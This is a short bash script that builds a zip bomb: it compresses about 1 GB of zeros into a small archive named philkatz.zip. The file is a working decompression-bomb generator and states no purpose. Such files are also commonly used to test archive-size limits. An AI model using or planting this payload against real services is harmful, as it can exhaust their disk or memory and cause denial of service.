#!/usr/bin/env bash

# This script creates a zip bomb that inflates to 1 GB

readonly FILENAME="philkatz.zip"
dd if=/dev/zero bs=1024 count=1000000 | zip "${FILENAME}" -
